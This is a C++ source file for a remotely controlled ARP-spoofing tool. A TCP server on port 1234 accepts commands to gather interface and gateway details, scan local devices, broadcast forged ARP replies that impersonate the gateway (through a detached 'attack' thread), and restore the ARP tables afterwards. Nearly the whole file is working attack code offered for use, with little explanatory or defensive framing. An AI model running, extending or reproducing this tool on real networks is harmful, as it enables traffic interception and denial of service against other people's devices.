#include <stdio.h>
#include "get_info.h"
#include "socket.h"
#include "arp_spoof.h"

int server_sock, client_sock;

volatile bool broad_run = false;

int main(){
    
    int server_port = 1234;

    //socket connection
    if ((server_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
        printf("socket create error\n");
        return -1;
    }

    int option = 1;
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option)) < 0){
        printf("socket option set error\n");
        return -1;
    }

    struct sockaddr_in server_addr, client_addr;
    memset(&server_addr, 0x00, sizeof(server_addr));
    memset(&client_addr, 0x00, sizeof(client_addr));
    int client_addr_size = sizeof(client_addr);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        printf("bind error\n");
        return -1;
    }

    if (listen(server_sock, 5) < 0)
    {
        printf("listen error\n");
        return -1;
    }

    if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, (socklen_t *)&client_addr_size)) < 0)
    {
        printf("accept error\n");
    }

    printf("connection ok\n");

    Arp arp = Arp();
    int len, msg_size;
    uint8_t broad[6];
    uint32_t broad_ip = 0;
    memset(broad, 0xff, sizeof(broad));
    
    Info info = Info();
    int recv_len = 0;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle;

    char rdata[1024] = {0,};
    char sdata[1024] = {0,};

    while(1){

        memset(rdata, 0x00, BUF_SIZE);
        recv_data(client_sock, rdata);
        printf("recv data >> %s\n", rdata);

        int signal = atoi(&rdata[0]);
        
        // 1. get basic informations
        if(signal == 1){
            printf("[+] recv data >> %s\n", recv_data);
            info.save_iface_name();
            info.save_gw_ip();
            info.save_my_ip();
            info.save_my_mac(info.iface_name);
            printf("%s\n", info.iface_name);
            print_ip(info.gw_ip);
            print_ip(info.ip);
            print_MAC(info.attacker_mac);

        }
        
        // 2. broadcast attack signal
        if(signal == 2){
            broad_run = true;

            handle = pcap_open_live(info.iface_name, BUFSIZ, 1, 1000, errbuf);
            if (handle == NULL) {
                fprintf(stderr, "couldn't open device %s: %s\n", arp.dev, errbuf);
                return -1;
            }

            strncpy(arp.dev, info.iface_name, strlen(info.iface_name)); 
            memcpy(arp.sender_mac, info.attacker_mac, sizeof(arp.sender_mac));
            arp.sender_ip = info.gw_ip;

            ARP_Packet * arp_data = (ARP_Packet *)malloc(sizeof(ARP_Packet));
            arp.make_arp_packet(broad, info.attacker_mac, 0x2, info.gw_ip, broad_ip, arp_data);
            memcpy(arp.attack_pkt, arp_data, sizeof(ARP_Packet));

            // to restore arp table, we need gw mac address 
            memset(arp_data, 0, sizeof(ARP_Packet));
            arp.make_arp_packet(broad, info.attacker_mac, 0x1, info.ip, info.gw_ip, arp_data);
            memcpy(arp.pkt, arp_data, sizeof(ARP_Packet));

            if(pcap_sendpacket(handle, arp.pkt, sizeof(ARP_Packet))!=0){
                printf("[-] couldn't send attack pkt\n");
                return -1;
            }
            printf("[+] success to send find gw mac pkt\n");

            ARP_Packet * arp_packet;
            struct pcap_pkthdr* header;
            const u_char * rep;
            while(1){ //check correct arp reply
                pcap_next_ex(handle, &header, &rep);
                arp_packet = (ARP_Packet *)rep;
                if((arp_packet->arp.sender_ip == info.gw_ip) && (ntohs(arp_packet->arp.opcode) == 2)){
                    printf("[+] success to find gw mac pkt!!!!!!!!\n");
                    memcpy(info.gw_mac, arp_packet->eth.src_MAC, sizeof(info.gw_mac));
                    break;
                }
            }
            std::thread attack_thread(attack, handle, arp, client_sock);
            attack_thread.detach();
            free(arp_data);
        }
        // 3. scan devices
        if(signal == 3){
            Arp find_dev_arp = Arp();
            find_dev_arp.sender_ip = info.ip;
            memcpy(find_dev_arp.sender_mac, info.attacker_mac, sizeof(uint8_t)*6);
            std::thread scan_send_thread(scan_pkt_send, info, find_dev_arp, client_sock);
            scan_send_thread.detach();
        }
        // 4. unicast attack
        if(signal == 4){

        }

        // 5. stop broadcast attack signal
        if(signal == 5){
            broad_run = false;
            memset(arp.pkt, 0, sizeof(arp.pkt));
            ARP_Packet * p = (ARP_Packet *)arp.attack_pkt;
            memcpy(p->arp.sender_mac, info.gw_mac, sizeof(info.gw_mac));

            sleep(2);
            
            for(int i=0; i<3;i++){
                if(pcap_sendpacket(handle, arp.attack_pkt, sizeof(ARP_Packet))!=0){
                    return -1;
                }
                sleep(1);
            }
        }  
        printf("----------------------\n");
    }
    close(client_sock);
    close(server_sock);
}